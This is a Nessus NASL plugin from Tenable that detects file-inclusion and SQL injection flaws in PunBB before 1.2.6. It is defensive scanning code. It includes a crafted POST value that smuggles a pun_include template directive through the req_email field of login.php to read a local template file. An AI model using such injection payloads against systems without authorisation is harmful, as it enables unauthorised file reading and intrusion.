#
# (C) Tenable Network Security
# 

include("compat.inc");

if (description) {
  script_id(18658);
  script_version("$Revision: 1.7 $");

  script_cve_id("CVE-2005-2193");
  script_bugtraq_id(14195, 14196);
  if (defined_func("script_xref")) {
    script_xref(name:"OSVDB", value:"17785");
    script_xref(name:"OSVDB", value:"17786");
  }

  name["english"] = "PunBB < 1.2.6 Multiple Vulnerabilities";
  script_name(english:name["english"]);
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by
multiple vulnerabilities." );
 script_set_attribute(attribute:"description", value:
"The remote version of PunBB contains a flaw in its template system
that can be exploited to read arbitrary local files or, if an attacker
can upload a specially-crafted avatar, to execute arbitrary PHP code. 

In addition, the application fails to sanitize the 'temp' parameter of
the 'profile.php' script before using it in a database query, which
allows for SQL injection attacks." );
 script_set_attribute(attribute:"see_also", value:"http://www.hardened-php.net/index.38.html" );
 script_set_attribute(attribute:"see_also", value:"http://www.hardened-php.net/index.39.html" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to PunBB 1.2.6 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
script_end_attributes();

 
  summary["english"] = "Detects multiple vulnerabilities in PunBB < 1.2.6";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");
 
  script_copyright(english:"This script is Copyright (C) 2005-2009 Tenable Network Security, Inc.");

  script_dependencies("punBB_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/punBB"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
  dir = matches[2];

  # Check whether the script 'login.php' exists -- it's used in the exploit.
  r = http_send_recv3(method:"GET", item:string(dir, "/login.php"), port:port);
  if (isnull(r)) exit(0);
  res = r[2];

  # If it does...
  if ('method="post" action="login.php?action=in"' >< res) {
    # Try to exploit the flaw to read a file in the distribution.
    postdata = string(
      "form_sent=1&",
      'req_email=<pun_include%20"./include/template/main.tpl">@nessus.org'
    );
    r = http_send_recv3(method: "POST ", item: dir+"/login.php?action=forget", version: 11, port: port,
      add_headers: make_array("Content-Type", "application/x-www-form-urlencoded"),
      data: postdata);
    if (isnull(r)) exit(0);
    res = r[2];

    # There's a problem if it looks like a template.
    if (egrep(string:res, pattern:"<pun_(head|page|title|char_encoding)>")) {
      security_hole(port);
      set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
      exit(0);
    }
  }
}
